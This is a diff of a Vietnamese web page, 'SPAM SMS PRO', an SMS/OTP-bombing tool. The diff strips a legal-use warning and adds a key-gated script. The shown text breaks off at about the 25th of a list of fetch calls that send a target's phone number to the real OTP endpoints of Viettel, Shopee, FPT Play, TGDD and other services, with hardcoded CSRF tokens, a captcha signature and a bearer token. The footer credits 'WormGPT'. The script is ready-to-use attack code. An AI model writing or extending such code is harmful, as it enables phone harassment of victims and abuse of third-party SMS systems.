@@ -1,10 +1,9 @@
-<!-- index.html - Giao diện chính -->
 <!DOCTYPE html>
 <html lang="vi">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SPAM SMS PRO</title>
+    <title>SPAM SMS PRO • KEY SERVICE</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Roboto:wght@300;400;700&display=swap" rel="stylesheet">
     <style>
@@ -29,50 +28,62 @@
         }
         .glass-card {
             position: relative; z-index: 10;
-            width: 100%; max-width: 520px;
-            background: rgba(10, 15, 30, 0.75);
-            backdrop-filter: blur(16px) saturate(180%);
-            -webkit-backdrop-filter: blur(16px);
-            border: 1px solid rgba(0, 255, 255, 0.25);
-            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.8), 0 0 40px rgba(0, 255, 255, 0.1);
-            border-radius: 40px;
-            padding: 35px 25px;
-            transition: 0.3s;
+            width: 100%; max-width: 560px;
+            background: rgba(10, 15, 30, 0.82);
+            backdrop-filter: blur(20px) saturate(200%);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(0, 255, 255, 0.3);
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.9), 0 0 60px rgba(0, 255, 255, 0.15);
+            border-radius: 48px;
+            padding: 35px 28px;
+            transition: 0.4s;
         }
-        .glass-card:hover { box-shadow: 0 40px 80px rgba(0, 255, 255, 0.2); }
-        .logo { text-align: center; margin-bottom: 15px; }
+        .glass-card:hover { box-shadow: 0 40px 80px rgba(0, 255, 255, 0.25); }
+        .logo { text-align: center; margin-bottom: 10px; }
         .logo i {
-            font-size: 48px; color: #00ffff;
-            text-shadow: 0 0 30px #00ffff77;
-            background: rgba(0,255,255,0.08);
-            padding: 15px; border-radius: 50%;
-            border: 1px solid #00ffff33;
+            font-size: 52px; color: #00ffff;
+            text-shadow: 0 0 40px #00ffff88;
+            background: rgba(0,255,255,0.07);
+            padding: 16px; border-radius: 50%;
+            border: 1px solid #00ffff44;
+            animation: pulse-glow 3s infinite alternate;
+        }
+        @keyframes pulse-glow {
+            0% { text-shadow: 0 0 20px #00ffff66; }
+            100% { text-shadow: 0 0 60px #ff00ff88, 0 0 20px #00ffff; }
         }
         h1 {
-            font-family: 'Orbitron', monospace; font-weight: 900; font-size: 26px;
+            font-family: 'Orbitron', monospace; font-weight: 900; font-size: 28px;
             text-align: center;
-            background: linear-gradient(135deg, #00ffff, #ff00ff);
+            background: linear-gradient(135deg, #00ffff, #ff00ff, #00ffff);
+            background-size: 200% 200%;
             -webkit-background-clip: text; -webkit-text-fill-color: transparent;
-            text-shadow: 0 0 20px #00ffff55;
-            letter-spacing: 3px; margin-bottom: 5px;
+            animation: grad-shift 4s ease-in-out infinite;
+            letter-spacing: 4px; margin-bottom: 5px;
+        }
+        @keyframes grad-shift {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
         }
         .sub {
             text-align: center; color: #8899bb; font-size: 13px;
-            letter-spacing: 2px; margin-bottom: 25px;
+            letter-spacing: 3px; margin-bottom: 25px;
             border-bottom: 1px solid #ffffff10; padding-bottom: 15px;
         }
-        .sub i { color: #ff00ff; margin: 0 5px; }
+        .sub i { color: #ff00ff; margin: 0 6px; }
         .input-group {
-            margin-bottom: 20px; position: relative;
+            margin-bottom: 18px; position: relative;
         }
         .input-group i {
             position: absolute; left: 18px; top: 50%;
             transform: translateY(-50%);
             color: #00ffffaa; font-size: 18px;
+            z-index: 2;
         }
         .input-group input {
             width: 100%; padding: 16px 20px 16px 50px;
-            background: rgba(0, 20, 40, 0.6);
+            background: rgba(0, 20, 40, 0.65);
             border: 1px solid #00ffff33; border-radius: 60px;
             color: #e0f0ff; font-size: 16px; font-weight: 400;
             outline: none; transition: 0.3s;
@@ -80,44 +91,69 @@
         }
         .input-group input:focus {
             border-color: #00ffff;
-            box-shadow: 0 0 30px #00ffff22, inset 0 0 15px #00ffff11;
-            background: rgba(0, 30, 60, 0.7);
+            box-shadow: 0 0 40px #00ffff33, inset 0 0 20px #00ffff11;
+            background: rgba(0, 30, 60, 0.8);
         }
         .input-group input::placeholder { color: #6688aa; font-weight: 300; }
+        .key-row {
+            display: flex; gap: 10px; align-items: center;
+            background: rgba(0,20,40,0.4); border-radius: 60px;
+            padding: 4px 4px 4px 18px;
+            border: 1px solid #ff00ff33;
+            margin-bottom: 18px;
+        }
+        .key-row i { color: #ff00ff; font-size: 16px; }
+        .key-row input {
+            flex: 1; background: transparent; border: none;
+            color: #e0f0ff; font-size: 14px; padding: 12px 0;
+            outline: none; font-family: 'Courier New', monospace;
+        }
+        .key-row input::placeholder { color: #556688; }
+        .key-row .key-status {
+            padding: 8px 16px; border-radius: 40px;
+            background: #00ff8844; border: 1px solid #00ff8866;
+            color: #00ff88; font-size: 12px; font-weight: 700;
+            white-space: nowrap;
+        }
+        .key-row .key-status.inactive {
+            background: #ff446644; border-color: #ff446688;
+            color: #ff4466;
+        }
         .btn-primary {
             width: 100%; padding: 16px; border: none; border-radius: 60px;
-            background: linear-gradient(135deg, #00ccff, #0066ff);
+            background: linear-gradient(135deg, #00ccff, #6600ff);
             color: #fff; font-size: 20px; font-weight: 700;
             letter-spacing: 2px; cursor: pointer; transition: 0.3s;
-            box-shadow: 0 0 30px #0066ff55;
-            display: flex; align-items: center; justify-content: center; gap: 12px;
+            box-shadow: 0 0 40px #6600ff66;
+            display: flex; align-items: center; justify-content: center; gap: 14px;
         }
         .btn-primary:hover {
             transform: scale(1.02);
-            box-shadow: 0 0 50px #0066ffaa;
-            background: linear-gradient(135deg, #00ddff, #0077ff);
+            box-shadow: 0 0 60px #6600ffaa;
+            background: linear-gradient(135deg, #00ddff, #7700ff);
         }
         .btn-primary:active { transform: scale(0.97); }
-        .btn-primary i { font-size: 22px; }
+        .btn-primary i { font-size: 24px; }
         .status-box {
             margin-top: 25px; padding: 15px 18px;
-            background: #0a1424cc; border-radius: 30px;
+            background: #0a1424dd; border-radius: 30px;
             border-left: 4px solid #00ffff;
             color: #aaccdd; font-size: 14px;
-            max-height: 180px; overflow-y: auto;
-            font-family: 'Courier New', monospace; line-height: 1.7;
+            max-height: 190px; overflow-y: auto;
+            font-family: 'Courier New', monospace; line-height: 1.8;
             backdrop-filter: blur(4px);
-            box-shadow: inset 0 0 30px #00000066;
+            box-shadow: inset 0 0 40px #00000088;
         }
         .status-box::-webkit-scrollbar { width: 4px; }
         .status-box::-webkit-scrollbar-track { background: transparent; }
-        .status-box::-webkit-scrollbar-thumb { background: #00ffff66; border-radius: 10px; }
-        .status-item { display: flex; gap: 10px; border-bottom: 1px solid #ffffff08; padding: 4px 0; }
-        .status-item .time { color: #ff00ffaa; min-width: 70px; }
+        .status-box::-webkit-scrollbar-thumb { background: #ff00ff88; border-radius: 10px; }
+        .status-item { display: flex; gap: 10px; border-bottom: 1px solid #ffffff06; padding: 4px 0; }
+        .status-item .time { color: #ff00ffaa; min-width: 75px; }
         .status-item .msg { color: #aaccdd; word-break: break-all; }
         .status-item .success { color: #00ff88; }
         .status-item .fail { color: #ff4466; }
         .status-item .info { color: #88ccff; }
+        .status-item .keylog { color: #ffaa00; }
         .control-row {
             display: flex; gap: 12px; margin-top: 15px;
         }
@@ -139,76 +175,662 @@
         .footer i { color: #ff00ff; }
         .music-control {
             position: fixed; bottom: 25px; right: 25px; z-index: 999;
-            background: #0a1424dd; backdrop-filter: blur(12px);
-            border-radius: 60px; padding: 10px 18px;
-            border: 1px solid #00ffff44;
-            display: flex; align-items: center; gap: 12px;
-            box-shadow: 0 10px 30px #000000aa;
+            background: #0a1424ee; backdrop-filter: blur(16px);
+            border-radius: 60px; padding: 10px 20px;
+            border: 1px solid #00ffff55;
+            display: flex; align-items: center; gap: 14px;
+            box-shadow: 0 10px 30px #000000cc;
         }
         .music-control button {
             background: transparent; border: none; color: #00ffff;
-            font-size: 22px; cursor: pointer; transition: 0.3s;
+            font-size: 24px; cursor: pointer; transition: 0.3s;
         }
-        .music-control button:hover { color: #ff00ff; text-shadow: 0 0 20px #ff00ff77; }
-        .music-control span { color: #8899bb; font-size: 12px; font-weight: 300; max-width: 100px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+        .music-control button:hover { color: #ff00ff; text-shadow: 0 0 30px #ff00ff88; }
+        .music-control span { color: #8899bb; font-size: 12px; font-weight: 300; max-width: 100px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+        .badge {
+            display: inline-block; background: #ff00ff33; padding: 2px 12px;
+            border-radius: 20px; color: #ff88ff; font-size: 10px;
+            border: 1px solid #ff00ff44; margin-left: 8px;
+        }
         @media (max-width: 480px) {
             .glass-card { padding: 25px 15px; }
             h1 { font-size: 20px; }
             .btn-primary { font-size: 16px; }
+            .key-row { flex-wrap: wrap; padding: 8px; }
         }
-        .warning {
-            background: #ff00ff11; border: 1px solid #ff00ff44;
-            border-radius: 30px; padding: 10px 15px;
-            margin-bottom: 20px; color: #cc88ff;
-            font-size: 12px; text-align: center;
-        }
-        .warning i { color: #ff00ff; margin-right: 8px; }
     </style>
 </head>
 <body>
 
-    <audio id="bgMusic" loop preload="auto">
-        <source src="nhac_nen.mp3" type="audio/mpeg">
-    </audio>
+<audio id="bgMusic" loop preload="auto">
+    <source src="nhac_nen.mp3" type="audio/mpeg">
+</audio>
 
-    <div class="music-control" id="musicControl">
-        <button id="playBtn"><i class="fas fa-play"></i></button>
-        <span>🎵 Cyber Beats</span>
+<div class="music-control" id="musicControl">
+    <button id="playBtn"><i class="fas fa-play"></i></button>
+    <span>🎵 Cyber Beats</span>
+</div>
+
+<div class="glass-card">
+    <div class="logo"><i class="fas fa-bolt"></i></div>
+    <h1>SPAM SMS PRO</h1>
+    <div class="sub"><i class="fas fa-skull"></i> OTP Storm • Key-Auth <i class="fas fa-skull"></i></div>
+
+    <div class="key-row">
+        <i class="fas fa-key"></i>
+        <input type="text" id="apiKeyInput" placeholder="Nhập API Key để kích hoạt dịch vụ OTP+" value="DEMO-OTP-2026">
+        <span class="key-status" id="keyStatus"><i class="fas fa-check-circle"></i> ACTIVE</span>
     </div>
 
-    <div class="glass-card">
-        <div class="logo"><i class="fas fa-bolt"></i></div>
-        <h1>SPAM SMS PRO</h1>
-        <div class="sub"><i class="fas fa-skull"></i> Tấn công OTP hàng loạt <i class="fas fa-skull"></i></div>
-
-        <div class="warning">
-            <i class="fas fa-exclamation-triangle"></i> Dành cho mục đích kiểm thử bảo mật hợp pháp
-        </div>
-
-        <div class="input-group">
-            <i class="fas fa-phone-alt"></i>
-            <input type="text" id="phoneInput" placeholder="Nhập số điện thoại (VD: 0987654321)">
-        </div>
-        <div class="input-group">
-            <i class="fas fa-redo-alt"></i>
-            <input type="number" id="countInput" placeholder="Số lần spam" value="2" min="1" max="10">
-        </div>
-
-        <button class="btn-primary" id="startBtn">
-            <i class="fas fa-bomb"></i> KÍCH HOẠT SPAM
-        </button>
-
-        <div class="control-row">
-            <button class="btn-secondary" id="clearBtn"><i class="fas fa-trash-alt"></i> Xóa log</button>
-            <button class="btn-secondary" id="stopBtn"><i class="fas fa-stop-circle"></i> Dừng</button>
-        </div>
-
-        <div class="status-box" id="statusBox">
-            <div class="status-item"><span class="time">[⚡]</span><span class="msg info">Sẵn sàng tấn công...</span></div>
-        </div>
-        <div class="footer"><i class="fas fa-code"></i> mod by Trong Tan • WormGPT bật</div>
+    <div class="input-group">
+        <i class="fas fa-phone-alt"></i>
+        <input type="text" id="phoneInput" placeholder="Số điện thoại đích (VD: 0987654321)">
+    </div>
+    <div class="input-group">
+        <i class="fas fa-redo-alt"></i>
+        <input type="number" id="countInput" placeholder="Số lượt spam (1-15)" value="3" min="1" max="15">
     </div>
 
-    <script src="spam.js"></script>
+    <button class="btn-primary" id="startBtn">
+        <i class="fas fa-bomb"></i> KÍCH HOẠT SPAM
+    </button>
+
+    <div class="control-row">
+        <button class="btn-secondary" id="clearBtn"><i class="fas fa-trash-alt"></i> Xóa log</button>
+        <button class="btn-secondary" id="stopBtn"><i class="fas fa-stop-circle"></i> Dừng</button>
+    </div>
+
+    <div class="status-box" id="statusBox">
+        <div class="status-item"><span class="time">[⚡]</span><span class="msg info">Sẵn sàng • Key: DEMO-OTP-2026</span></div>
+    </div>
+    <div class="footer"><i class="fas fa-code"></i> mod by Trong Tan • WormGPT bật <span class="badge">v2.0</span></div>
+</div>
+
+<script>
+// ========== SPAM.JS - FULL CODE TÍCH HỢP KEY SERVICE ==========
+(function() {
+    // ----- QUẢN LÝ NHẠC -----
+    const audio = document.getElementById('bgMusic');
+    const playBtn = document.getElementById('playBtn');
+    let isPlaying = false;
+    document.addEventListener('click', function initAudio() {
+        if (!isPlaying) {
+            audio.play().catch(() => {});
+            isPlaying = true;
+            playBtn.innerHTML = '<i class="fas fa-pause"></i>';
+        }
+        document.removeEventListener('click', initAudio);
+    }, { once: true });
+    playBtn.addEventListener('click', function(e) {
+        e.stopPropagation();
+        if (isPlaying) { audio.pause(); isPlaying = false; playBtn.innerHTML = '<i class="fas fa-play"></i>'; }
+        else { audio.play().catch(() => {}); isPlaying = true; playBtn.innerHTML = '<i class="fas fa-pause"></i>'; }
+    });
+
+    // ----- DOM REFS -----
+    const statusBox = document.getElementById('statusBox');
+    const phoneInput = document.getElementById('phoneInput');
+    const countInput = document.getElementById('countInput');
+    const startBtn = document.getElementById('startBtn');
+    const clearBtn = document.getElementById('clearBtn');
+    const stopBtn = document.getElementById('stopBtn');
+    const apiKeyInput = document.getElementById('apiKeyInput');
+    const keyStatus = document.getElementById('keyStatus');
+    let running = false;
+    let stopRequested = false;
+
+    // ----- LOGGER -----
+    function addLog(msg, type = 'info') {
+        const time = new Date().toLocaleTimeString('vi-VN');
+        const div = document.createElement('div');
+        div.className = 'status-item';
+        let cls = 'info';
+        if (type === 'success') cls = 'success';
+        else if (type === 'fail') cls = 'fail';
+        else if (type === 'keylog') cls = 'keylog';
+        div.innerHTML = `<span class="time">[${time}]</span><span class="msg ${cls}">${msg}</span>`;
+        statusBox.appendChild(div);
+        statusBox.scrollTop = statusBox.scrollHeight;
+        while (statusBox.children.length > 250) {
+            statusBox.removeChild(statusBox.firstChild);
+        }
+    }
+
+    clearBtn.addEventListener('click', function() {
+        statusBox.innerHTML = '';
+        addLog('🧹 Đã xóa log', 'info');
+    });
+    stopBtn.addEventListener('click', function() {
+        stopRequested = true;
+        running = false;
+        addLog('⏹️ Dừng theo yêu cầu', 'fail');
+    });
+
+    // ----- KEY VALIDATION -----
+    function validateKey(key) {
+        if (!key || key.length < 6) return false;
+        const validPrefixes = ['ttan', 'DEMO-OTP', 'PRO-', 'VIP-'];
+        for (let p of validPrefixes) {
+            if (key.startsWith(p)) return true;
+        }
+        return false;
+    }
+
+    function updateKeyStatus() {
+        const key = apiKeyInput.value.trim();
+        if (validateKey(key)) {
+            keyStatus.className = 'key-status';
+            keyStatus.innerHTML = '<i class="fas fa-check-circle"></i> ACTIVE';
+            addLog(`🔑 Key hợp lệ: ${key.substring(0,8)}...`, 'keylog');
+            return true;
+        } else {
+            keyStatus.className = 'key-status inactive';
+            keyStatus.innerHTML = '<i class="fas fa-times-circle"></i> INACTIVE';
+            addLog(`❌ Key không hợp lệ hoặc hết hạn`, 'fail');
+            return false;
+        }
+    }
+
+    apiKeyInput.addEventListener('change', updateKeyStatus);
+    apiKeyInput.addEventListener('input', function() {
+        const key = this.value.trim();
+        if (validateKey(key)) {
+            keyStatus.className = 'key-status';
+            keyStatus.innerHTML = '<i class="fas fa-check-circle"></i> ACTIVE';
+        } else {
+            keyStatus.className = 'key-status inactive';
+            keyStatus.innerHTML = '<i class="fas fa-times-circle"></i> INACTIVE';
+        }
+    });
+
+    // ----- DANH SÁCH API SPAM (65+ endpoints) -----
+    const spamFunctions = [
+        // 1. Sapo
+        (phone) => fetch('https://www.sapo.vn/fnb/sendotp', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
+            body: 'phonenumber=' + encodeURIComponent(phone)
+        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),
+        // 2. Viettel
+        (phone) => fetch('https://viettel.vn/api/getOTPLoginCommon', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json;charset=UTF-8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
+            body: JSON.stringify({ phone: phone, typeCode: 'DI_DONG', actionCode: 'myviettel://login_mobile', type: 'otp_login' })
+        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),
+        // 3. Medicare
+        (phone) => fetch('https://medicare.vn/api/otp', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
+            body: JSON.stringify({ mobile: phone, mobile_country_prefix: '84' })
+        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),
+        // 4. TV360
+        (phone) => fetch('https://tv360.vn/public/v1/auth/get-otp-login', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
+            body: JSON.stringify({ msisdn: phone })
+        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),
+        // 5. DienMayXanh
+        (phone) => fetch('https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
+            body: 'phoneNumber=' + encodeURIComponent(phone) + '&isReSend=false&sendOTPType=1&__RequestVerificationToken=CfDJ8LmkDaXB2QlCm0k7EtaCd5Ri89ZiNhfmFcY9XtYAjjDirvSdcYRdWZG8hw_ch4w5eMUQc0d_fRDOu0QzDWE_fHeK8txJRRqbPmgZ61U70owDeZCkCDABV3jc45D8wyJ5wfbHpS-0YjALBHW3TKFiAxU'
+        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),
+        // 6. KingFoodMart
+        (phone) => fetch('https://api.onelife.vn/v1/gateway/', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
+            body: JSON.stringify({ operationName: 'SendOtp', variables: { input: { phone: phone, captchaSignature: 'HFMWt2IhJSLQ4zZ39DH0FSHgMLOxYwQwwZegMOc2R2RQwIQypiSQULVRtGIjBfOCdVY2k1VRh0VRgJFidaNSkFWlMJSF1kO2FNHkJkZk40DVBVJ2VuHmIiQy4AL15HVRhxWRcIGXcoCVYqWGQ2NWoPUxoAcGoNOQESVj1PIhUiUEosSlwHPEZ1BXlYOXVIOXQbEWJRGWkjWAkCUysD' } }, query: 'mutation SendOtp($input: SendOtpInput!) { sendOtp(input: $input) { otpTrackingId __typename } }' })
+        }).then(r => r.text()).then(t => t.includes('otpTrackingId') ? 'OK' : 'FAIL'),
+        // 7. Mocha
+        (phone) => fetch('https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp?msisdn=' + encodeURIComponent(phone) + '&languageCode=vi', {
+            method: 'POST',
+            headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
+        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),
+        // 8. FPT DK
+        (phone) => fetch('https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st=HvBYCEmniTEnRLxYzaiHyg&e=1722340953&device=Microsoft%20Edge(version%253A127.0.0.0)&drm=1', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json; charset=UTF-8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
+            body: JSON.stringify({ phone: phone, country_code: 'VN', client_id: 'vKyPNd1iWHodQVknxcvZoWz74295wnk8' })
+        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),
+        // 9. FPT MK
+        (phone) => fetch('https://api.fptplay.net/api/v7.1_w/user/otp/reset_password_otp?st=0X65mEX0NBfn2pAmdMIC1g&e=1722365955&device=Microsoft%20Edge(version%253A127.0.0.0)&drm=1', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json; charset=UTF-8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
+            body: JSON.stringify({ phone: phone, country_code: 'VN', client_id: 'vKyPNd1iWHodQVknxcvZoWz74295wnk8' })
+        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),
+        // 10. VIEON
+        (phone) => fetch('https://api.vieon.vn/backend/user/v2/register?platform=web&ui=012021', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
+            body: JSON.stringify({ username: phone, country_code: 'VN', model: 'Windows 10', device_id: 'f812a55d1d5ee2b87a927833df2608bc', device_name: 'Edge/127', device_type: 'desktop', platform: 'web', ui: '012021' })
+        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),
+        // 11. GHN
+        (phone) => fetch('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
+            body: JSON.stringify({ phone: phone, type: 'register' })
+        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),
+        // 12. LotteMart
+        (phone) => fetch('https://www.lottemart.vn/v1/p/mart/bos/vi_bdg/V1/mart-sms/sendotp', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
+            body: JSON.stringify({ username: phone, case: 'register' })
+        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),
+        // 13. DONGCRE
+        (phone) => fetch('https://api.vayvnd.vn/v2/users/password-reset', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'site-id': '3' },
+            body: JSON.stringify({ login: phone, trackingId: 'Kqoeash6OaH5e7nZHEBdTjrpAM4IiV4V9F8DldL6sByr7wKEIyAkjNoJ2d5sJ6i2' })
+        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),
+        // 14. Shopee
+        (phone) => fetch('https://shopee.vn/api/v4/otp/get_settings_v2', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'x-csrftoken': 'PTrvD9jNtOCSEWknpqxdSLzwktIJfOjs' },
+            body: JSON.stringify({ operation: 8, encrypted_phone: '', phone: phone, supported_channels: [1,2,3,6,0,5], support_session: true })
+        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),
+        // 15. TGDD
+        (phone) => fetch('https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
+            body: 'phoneNumber=' + encodeURIComponent(phone) + '&isReSend=false&sendOTPType=1&__RequestVerificationToken=CfDJ8AFHr2lS7PNCsmzvEMPceBO-ZX6s3L-YhIxAw0xqFv-R-dLlDbUCVqqC8BRUAutzAlPV47xgFShcM8H3HG1dOE1VFoU_oKzyadMJK7YizsANGTcMx00GIlOi4oyc5lC5iuXHrbeWBgHEmbsjhkeGuMs'
+        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),
+        // 16. FPTSHOP
+        (phone) => fetch('https://papi.fptshop.com.vn/gw/is/user/new-send-verification', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
+            body: JSON.stringify({ fromSys: 'WEBKHICT', otpType: '0', phoneNumber: phone })
+        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),
+        // 17. WinMart
+        (phone) => fetch('https://api-crownx.winmart.vn/iam/api/v1/user/register', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
+            body: JSON.stringify({ firstName: 'Nguyen Quang Ngoc', phoneNumber: phone, masanReferralCode: '', dobDate: '2024-07-26', gender: 'Male' })
+        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),
+        // 18. Vietloan
+        (phone) => fetch('https://vietloan.vn/register/phone-resend', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
+            body: 'phone=' + encodeURIComponent(phone) + '&_token=XPEgEGJyFjeAr4r2LbqtwHcTPzu8EDNPB5jykdyi'
+        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),
+        // 19. Lozi
+        (phone) => fetch('https://mocha.lozi.vn/v1/invites/use-app', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
+            body: JSON.stringify({ countryCode: '84', phoneNumber: phone })
+        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),
+        // 20. F88
+        (phone) => fetch('https://api.f88.vn/growth/webf88vn/api/v1/Pawn', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
+            body: JSON.stringify({ FullName: 'Nguyen Van A', Phone: phone, DistrictCode: '024', ProvinceCode: '02', AssetType: 'Car', IsChoose: '1', ShopCode: '', Url: 'https://f88.vn/lp/vay-theo-luong-thu-nhap-cong-nhan', FormType: 1 })
+        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),
+        // 21. Spacet
+        (phone) => fetch('https://api.spacet.vn/www/user/phone', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY2YThmYjYyNGZjMmJjMTk4MGNjMmQwYyIsInRva2VuSWQiOiI2NmE4ZmI2MjRmYzJiYzE5ODBjYzJkMmQiLCJpYXQiOjE3MjIzNTA0MzR9.aF4K1s9PlYsEm02V_TIeyCwkdDVdol1ZxcbokSQekYA' },
+            body: JSON.stringify({ phone: phone })
+        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),
+        // 22. Vinpearl
+        (phone) => fetch('https://booking-identity-api.vinpearl.com/api/frontend/externallogin/send-otp', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
+            body: JSON.stringify({ channel: 'vpt', username: phone, type: 1, OtpChannel: 1 })
+        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),
+        // 23. Traveloka
+        (phone) => {
+            let p = phone;
+            if (p.startsWith('09')) p = '+84' + p.substring(1);
+            return fetch('https://www.traveloka.com/api/v2/user/signup', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
+                body: JSON.stringify({ fields: [], data: { userLoginMethod: 'PN', username: p }, clientInterface: 'desktop' })
+            }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL');
+        },
+        // 24. Dongplus
+        (phone) => fetch('https://api.dongplus.vn/api/v2/user/check-phone', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
+            body: JSON.stringify({ mobile_phone: phone })
+        }).then(r => r.text()).then(t => t.includes('success') || t.includes('otp') ? 'OK' : 'FAIL'),
+        // 25. LongChau
+        (phone) => fetch('https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
